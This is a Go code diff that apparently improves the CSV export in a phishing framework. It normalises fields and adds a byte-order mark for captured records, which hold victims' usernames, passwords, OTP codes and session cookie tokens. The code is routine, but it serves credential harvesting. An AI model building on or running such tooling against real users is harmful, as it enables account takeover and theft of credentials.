@@ -173,6 +173,14 @@ func (d *Database) getExportRecords() ([]SessionExportRecord, error) {
 	return records, nil
 }
 
+func (d *Database) normalizeCsvField(s string) string {
+	s = strings.ReplaceAll(s, "\r\n", " ")
+	s = strings.ReplaceAll(s, "\r", " ")
+	s = strings.ReplaceAll(s, "\n", " ")
+	s = strings.ReplaceAll(s, "\t", " ")
+	return strings.TrimSpace(s)
+}
+
 func (d *Database) ExportSessionsCSV(prefix string) (string, error) {
 	records, err := d.getExportRecords()
 	if err != nil {
@@ -187,6 +195,10 @@ func (d *Database) ExportSessionsCSV(prefix string) (string, error) {
 	}
 	defer f.Close()
 
+	if _, err := f.Write([]byte{0xEF, 0xBB, 0xBF}); err != nil {
+		return "", err
+	}
+
 	w := csv.NewWriter(f)
 	defer w.Flush()
 
@@ -200,25 +212,28 @@ func (d *Database) ExportSessionsCSV(prefix string) (string, error) {
 	for _, r := range records {
 		row := []string{
 			strconv.Itoa(r.ID),
-			r.CreateTime,
-			r.UpdateTime,
-			r.SessionID,
-			r.BaseDomain,
-			r.Phishlet,
-			r.Username,
-			r.Password,
-			strings.Join(r.OtpCodes, ";"),
-			r.OtpFieldName,
-			r.UserAgent,
-			r.RemoteAddr,
-			r.LandingURL,
-			r.HttpTokens,
-			r.CookieTokens,
-			r.BodyTokens,
+			d.normalizeCsvField(r.CreateTime),
+			d.normalizeCsvField(r.UpdateTime),
+			d.normalizeCsvField(r.SessionID),
+			d.normalizeCsvField(r.BaseDomain),
+			d.normalizeCsvField(r.Phishlet),
+			d.normalizeCsvField(r.Username),
+			d.normalizeCsvField(r.Password),
+			d.normalizeCsvField(strings.Join(r.OtpCodes, ";")),
+			d.normalizeCsvField(r.OtpFieldName),
+			d.normalizeCsvField(r.UserAgent),
+			d.normalizeCsvField(r.RemoteAddr),
+			d.normalizeCsvField(r.LandingURL),
+			d.normalizeCsvField(r.HttpTokens),
+			d.normalizeCsvField(r.CookieTokens),
+			d.normalizeCsvField(r.BodyTokens),
 		}
 		if err := w.Write(row); err != nil {
 			return "", err
 		}
+	}
+	if err := w.Error(); err != nil {
+		return "", err
 	}
 	return filename, nil
 }
